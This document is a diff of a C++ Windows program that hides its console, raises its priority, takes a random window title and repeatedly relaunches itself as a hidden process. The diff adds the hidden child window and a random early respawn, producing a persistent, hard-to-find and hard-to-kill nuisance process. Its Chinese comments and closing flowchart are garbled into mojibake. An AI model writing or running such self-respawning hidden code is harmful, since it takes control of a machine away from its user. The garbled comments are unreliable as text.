@@ -5,56 +5,78 @@ using namespace std;
 int cnt = 0;
 void run()
 {
-	// è·å–å½“å‰æ¨¡å—çš„å®Œæ•´è·¯å¾„
-	wchar_t modulePath[MAX_PATH];
-	if (GetModuleFileNameW(NULL, modulePath, MAX_PATH) == 0)
+	// »ñÈ¡µ±Ç°Ä£¿éµÄÍêÕûÂ·¾¶
+	char modulePath[MAX_PATH];
+	if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0)
 	{
 		std::cerr << "Failed to get module file name." << std::endl;
 		return;
 	}
 
-	// æ‰“å°å½“å‰æ¨¡å—çš„è·¯å¾„ï¼Œç”¨äºè°ƒè¯•
-	std::cout << "Current module path: " << modulePath << std::endl;
+	// ´òÓ¡µ±Ç°Ä£¿éµÄÂ·¾¶£¬ÓÃÓÚµ÷ÊÔ
+	std::cout << "Current module path: " << modulePath << "\n\r\n\r";
 
-	// åˆ›å»ºæ–°çš„è¿›ç¨‹æ¥é‡æ–°æ‰“å¼€è‡ªå·±
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&pi, sizeof(pi));
+	// ´´½¨ĞÂµÄ½ø³ÌÀ´ÖØĞÂ´ò¿ª×Ô¼º
+	STARTUPINFOA si1 = { sizeof(si1) };
+	si1.dwFlags = STARTF_USESHOWWINDOW;
+	si1.wShowWindow = SW_HIDE;
+	si1.cbReserved2 = 0;
+	si1.lpReserved = NULL;
+	si1.lpDesktop = NULL;
+	char c[] = "114514 1919810";
+	si1.lpTitle = c;
+	si1.dwX = 0;
+	si1.dwY = 0;
+	si1.dwXSize = 0;
+	si1.dwYSize = 0;
+	si1.dwXCountChars = 0;
+	si1.dwYCountChars = 0;
+	si1.dwFillAttribute = 0;
+	LPSTARTUPINFOA si = &si1;
+	PROCESS_INFORMATION pi1 = { 0 };
+	pi1.dwProcessId = 0;
+	pi1.dwThreadId = 0;
+	LPPROCESS_INFORMATION pi = &pi1;
 
-	// ä½¿ç”¨CreateProcessåˆ›å»ºæ–°è¿›ç¨‹
-	if (!CreateProcessW(NULL,   // ä½¿ç”¨å½“å‰ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶
-		modulePath, // å‘½ä»¤è¡Œå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨å®Œæ•´çš„è·¯å¾„
-		NULL,   // è¿›ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿
-		NULL,   // çº¿ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿
-		FALSE,  // è®¾ç½®å¥æŸ„ç»§æ‰¿é€‰é¡¹
-		0,            // æ²¡æœ‰åˆ›å»ºæ ‡å¿—
-		NULL,   // ä½¿ç”¨çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå—
-		NULL,   // ä½¿ç”¨çˆ¶è¿›ç¨‹çš„èµ·å§‹ç›®å½•
-		&si,    // æŒ‡å‘ STARTUPINFO ç»“æ„çš„æŒ‡é’ˆ
-		&pi)   // æ¥æ”¶æ–°è¿›ç¨‹çš„ä¿¡æ¯
+	// Ê¹ÓÃCreateProcess´´½¨ĞÂ½ø³Ì
+	if (!CreateProcessA(NULL,   // Ê¹ÓÃµ±Ç°³ÌĞòµÄ¿ÉÖ´ĞĞÎÄ¼ş
+		modulePath, // ÃüÁîĞĞ²ÎÊı£¬ÕâÀïÊ¹ÓÃÍêÕûµÄÂ·¾¶
+		NULL,   // ½ø³Ì¾ä±ú²»¿É¼Ì³Ğ
+		NULL,   // Ïß³Ì¾ä±ú²»¿É¼Ì³Ğ
+		FALSE,  // ÉèÖÃ¾ä±ú¼Ì³ĞÑ¡Ïî
+		0,            // Ã»ÓĞ´´½¨±êÖ¾
+		NULL,   // Ê¹ÓÃ¸¸½ø³ÌµÄ»·¾³¿é
+		NULL,   // Ê¹ÓÃ¸¸½ø³ÌµÄÆğÊ¼Ä¿Â¼
+		si,    // Ö¸Ïò STARTUPINFO ½á¹¹µÄÖ¸Õë
+		pi)   // ½ÓÊÕĞÂ½ø³ÌµÄĞÅÏ¢
 		)
 	{
 		std::cerr << "Failed to create process." << std::endl;
 		return;
 	}
 
-	// // å…³é—­æ–°è¿›ç¨‹çš„çº¿ç¨‹å’Œå¥æŸ„
+	// // ¹Ø±ÕĞÂ½ø³ÌµÄÏß³ÌºÍ¾ä±ú
 	// CloseHandle(pi.hProcess);
 	// CloseHandle(pi.hThread);
 
-	// æ­£å¸¸é€€å‡ºå½“å‰è¿›ç¨‹ï¼Œè®©æ–°è¿›ç¨‹æ¥ç®¡ä»»åŠ¡
+	// Õı³£ÍË³öµ±Ç°½ø³Ì£¬ÈÃĞÂ½ø³Ì½Ó¹ÜÈÎÎñ
 	return;
 }
 int main()
 {
-	//éšè—çª—å£
+	srand(time(0));
+	//Òş²Ø´°¿Ú
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	//windows api è®¾ç½®è¿›ç¨‹ä¼˜å…ˆçº§
+	//windows api ÉèÖÃ½ø³ÌÓÅÏÈ¼¶
 	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
-	SetConsoleTitleA((string() + char(rand() % 26 + 'a') +
+	string s = string() + char(rand() % 26 + 'a') +
 		char(rand() % 26 + 'a') + char(rand() % 26 + 'a') +
 		char(rand() % 26 + 'a') + char(rand() % 26 + 'a') +
-		char(rand() % 26 + 'a') + char(rand() % 26 + 'a')).c_str());
+		char(rand() % 26 + 'a') + char(rand() % 26 + 'a');
+	cout << s << "\n\n\r";
+	SetConsoleTitleA((s).c_str());
+	if (rand() % 100 == 0)
+		run();
 	Sleep(10000);
 	run();
 	// atexit(run);
@@ -62,3 +84,19 @@ int main()
 		// Sleep(1000);
 	return 0;
 }
+/*
+flowchart TD
+	START["¿ªÊ¼"]
+	HIDE_CONSOLE["Òş²Ø¿ØÖÆÌ¨´°¿Ú"]
+	SET_PRIORITY["ÉèÖÃ½ø³ÌÓÅÏÈ¼¶Îª¸ß"]
+	SET_TITLE["ÉèÖÃ¿ØÖÆÌ¨±êÌâ"]
+	SLEEP["ĞİÃß10Ãë"]
+	RUN["µ÷ÓÃrunº¯Êı"]
+	END(("½áÊø"))
+	START --> HIDE_CONSOLE
+	HIDE_CONSOLE --> SET_PRIORITY
+	SET_PRIORITY --> SET_TITLE
+	SET_TITLE --> SLEEP
+	SLEEP --> RUN
+	RUN --> END
+*/
